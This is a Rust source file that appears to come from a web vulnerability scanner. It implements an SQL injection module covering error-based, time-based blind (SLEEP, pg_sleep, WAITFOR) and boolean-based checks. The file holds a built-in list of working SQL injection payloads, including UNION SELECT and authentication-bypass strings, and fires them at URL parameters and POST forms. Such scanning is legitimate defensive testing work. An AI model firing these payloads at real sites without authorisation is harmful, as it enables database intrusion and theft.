use async_trait::async_trait;
use regex::Regex;
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};
use crate::scanners::traits::VulnerabilityScanner;
use crate::core::crawler::CrawledPage;
use crate::reporting::models::Vulnerability;
use crate::error::VenomResult;

pub struct SqliScanner {
    payloads_path: PathBuf,
}

impl SqliScanner {
    pub fn new(payloads_path: &Path) -> Self {
        Self { payloads_path: payloads_path.to_path_buf() }
    }

    fn load_payloads(&self) -> Vec<String> {
        if let Ok(content) = std::fs::read_to_string(&self.payloads_path) {
            content.lines().map(|l| l.trim().to_string())
                .filter(|l| !l.is_empty() && !l.starts_with('#')).collect()
        } else {
            default_sqli_payloads()
        }
    }
}

#[async_trait]
impl VulnerabilityScanner for SqliScanner {
    fn name(&self) -> &str { "SQL Injection Scanner" }
    fn description(&self) -> &str { "Tests for error-based, boolean-blind, and time-based SQL injection" }

    async fn scan(
        &self,
        pages: &[CrawledPage],
        client: &reqwest::Client,
    ) -> VenomResult<Vec<Vulnerability>> {
        let mut vulns = Vec::new();
        let payloads = self.load_payloads();
        let mut tested = std::collections::HashSet::new();

        let error_patterns = vec![
            Regex::new(r"(?i)sql syntax.*mysql").unwrap(),
            Regex::new(r"(?i)warning.*mysql_").unwrap(),
            Regex::new(r"(?i)unclosed quotation mark").unwrap(),
            Regex::new(r"(?i)microsoft OLE DB Provider").unwrap(),
            Regex::new(r"(?i)postgresql.*error").unwrap(),
            Regex::new(r"(?i)ORA-\d{5}").unwrap(),
            Regex::new(r"(?i)sqlite3?\.OperationalError").unwrap(),
            Regex::new(r"(?i)pg_query\(\)").unwrap(),
            Regex::new(r"(?i)valid MySQL result").unwrap(),
            Regex::new(r"(?i)Syntax error.*in query").unwrap(),
            Regex::new(r"(?i)mysql_fetch").unwrap(),
            Regex::new(r"(?i)mysql_num_rows").unwrap(),
            Regex::new(r"(?i)num_rows").unwrap(),
            Regex::new(r"(?i)Error.*SQL").unwrap(),
            Regex::new(r"(?i)You have an error in your SQL").unwrap(),
        ];

        for page in pages {
            let cookie = page.auth_cookie.clone();

            // ===== TEST URL PARAMETERS =====
            for (param_name, param_value) in &page.params {
                let test_key = format!("sqli:{}:{}", page.url, param_name);
                if tested.contains(&test_key) { continue; }

                // --- Error-based SQLi ---
                for payload in &payloads {
                    let test_url = inject_param(&page.url, param_name, payload);

                    let mut req = client.get(&test_url);
                    if let Some(ref c) = cookie { req = req.header("Cookie", c); }

                    if let Ok(resp) = req.send().await {
                        if let Ok(body) = resp.text().await {
                            for pattern in &error_patterns {
                                if pattern.is_match(&body) {
                                    tested.insert(test_key.clone());
                                    vulns.push(create_sqli_vuln(
                                        &page.url, param_name, payload,
                                        "Error-Based SQL Injection",
                                        &format!("SQL error matched: {}", pattern.as_str()),
                                        "CRITICAL",
                                    ));
                                    break;
                                }
                            }
                        }
                    }
                    if tested.contains(&test_key) { break; }
                }

                if tested.contains(&test_key) { continue; }

                // --- Time-based blind SQLi ---
                let time_payloads = vec![
                    format!("{}'OR SLEEP(5)-- -", param_value),
                    format!("{}' OR pg_sleep(5)--", param_value),
                    format!("{} OR SLEEP(5)", param_value),
                    format!("{}' WAITFOR DELAY '0:0:5'--", param_value),
                ];

                for payload in &time_payloads {
                    let test_url = inject_param(&page.url, param_name, payload);
                    let start = Instant::now();

                    let mut req = client.get(&test_url);
                    if let Some(ref c) = cookie { req = req.header("Cookie", c); }

                    if let Ok(_) = req.send().await {
                        if start.elapsed() >= Duration::from_secs(4) {
                            tested.insert(test_key.clone());
                            vulns.push(create_sqli_vuln(
                                &page.url, param_name, payload,
                                "Time-Based Blind SQL Injection",
                                &format!("Response delayed {:.1}s (threshold: 4s)", start.elapsed().as_secs_f64()),
                                "CRITICAL",
                            ));
                            break;
                        }
                    }
                }

                if tested.contains(&test_key) { continue; }

                // --- Boolean-based blind SQLi ---
                let true_payload = format!("{} OR 1=1", param_value);
                let false_payload = format!("{} OR 1=2", param_value);

                let true_url = inject_param(&page.url, param_name, &true_payload);
                let false_url = inject_param(&page.url, param_name, &false_payload);

                let mut true_req = client.get(&true_url);
                let mut false_req = client.get(&false_url);
                if let Some(ref c) = cookie {
                    true_req = true_req.header("Cookie", c);
                    false_req = false_req.header("Cookie", c);
                }

                let true_resp = true_req.send().await.ok();
                let false_resp = false_req.send().await.ok();

                if let (Some(tr), Some(fr)) = (true_resp, false_resp) {
                    let true_body = tr.text().await.unwrap_or_default();
                    let false_body = fr.text().await.unwrap_or_default();

                    let diff = (true_body.len() as i64 - false_body.len() as i64).abs();
                    if diff > 100 && true_body.len() != false_body.len() {
                        tested.insert(test_key.clone());
                        vulns.push(create_sqli_vuln(
                            &page.url, param_name,
                            &format!("OR 1=1 vs OR 1=2"),
                            "Boolean-Based Blind SQL Injection",
                            &format!("Response length diff: {} bytes (true={}, false={})",
                                diff, true_body.len(), false_body.len()),
                            "HIGH",
                        ));
                    }
                }
            }

            // ===== TEST FORMS =====
            for form in &page.forms {
                if form.method != "POST" { continue; }

                for input in &form.inputs {
                    if input.input_type == "hidden" || input.input_type == "submit" { continue; }

                    let form_key = format!("sqli:form:{}:{}", form.action, input.name);
                    if tested.contains(&form_key) { continue; }

                    for payload in payloads.iter().take(8) {
                        let mut form_data = std::collections::HashMap::new();
                        for inp in &form.inputs {
                            if inp.name == input.name {
                                form_data.insert(inp.name.clone(), payload.clone());
                            } else {
                                form_data.insert(inp.name.clone(), inp.value.clone());
                            }
                        }

                        let mut req = client.post(&form.action).form(&form_data);
                        if let Some(ref c) = cookie { req = req.header("Cookie", c); }

                        if let Ok(resp) = req.send().await {
                            if let Ok(body) = resp.text().await {
                                for pattern in &error_patterns {
                                    if pattern.is_match(&body) {
                                        tested.insert(form_key.clone());
                                        vulns.push(create_sqli_vuln(
                                            &form.action, &input.name, payload,
                                            "Error-Based SQL Injection (POST Form)",
                                            &format!("SQL error in form response: {}", pattern.as_str()),
                                            "CRITICAL",
                                        ));
                                        break;
                                    }
                                }
                            }
                        }
                        if tested.contains(&form_key) { break; }
                    }
                }
            }
        }

        Ok(vulns)
    }
}

fn inject_param(url: &str, param: &str, payload: &str) -> String {
    if let Ok(mut parsed) = url::Url::parse(url) {
        let pairs: Vec<(String, String)> = parsed.query_pairs()
            .map(|(k, v)| {
                if k == param { (k.to_string(), payload.to_string()) }
                else { (k.to_string(), v.to_string()) }
            }).collect();
        parsed.query_pairs_mut().clear();
        for (k, v) in pairs { parsed.query_pairs_mut().append_pair(&k, &v); }
        parsed.to_string()
    } else { url.to_string() }
}

fn create_sqli_vuln(url: &str, param: &str, payload: &str, title: &str, evidence: &str, severity: &str) -> Vulnerability {
    let mut vuln = Vulnerability::new(title, "SQL Injection", severity, url);
    vuln.parameter = Some(param.to_string());
    vuln.payload = Some(payload.to_string());
    vuln.evidence = evidence.to_string();
    vuln.description = format!(
        "SQL Injection was detected in the '{}' parameter using payload: {}. \
         The application incorporates user input directly into SQL queries without proper sanitization.",
        param, payload
    );
    vuln.impact = "An attacker could read, modify, or delete database contents, \
         bypass authentication, or achieve remote code execution via SQL injection.".to_string();
    vuln.remediation = "1. Use parameterized queries (prepared statements)\n\
         2. Implement input validation with allowlists\n\
         3. Apply principle of least privilege to database accounts\n\
         4. Deploy a Web Application Firewall (WAF)".to_string();
    vuln.cwe_id = Some("CWE-89".to_string());
    vuln.references = vec![
        "https://owasp.org/www-community/attacks/SQL_Injection".to_string(),
        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html".to_string(),
        "https://portswigger.net/web-security/sql-injection".to_string(),
    ];
    vuln
}

fn default_sqli_payloads() -> Vec<String> {
    vec![
        "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
        "' OR 1=1#", "admin'--", "1' ORDER BY 1--", "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--", "' AND 1=CONVERT(int,(SELECT @@version))--",
        "1;SELECT * FROM users", "' OR ''='", "') OR ('1'='1",
        "1' AND '1'='1", "1' AND '1'='2", "1 OR 1=1", "' OR '1'='1'/*",
        "1' OR '1'='1'-- -", "' OR 1=1-- -", "1' OR '1'='1'#",
    ].iter().map(|s| s.to_string()).collect()
}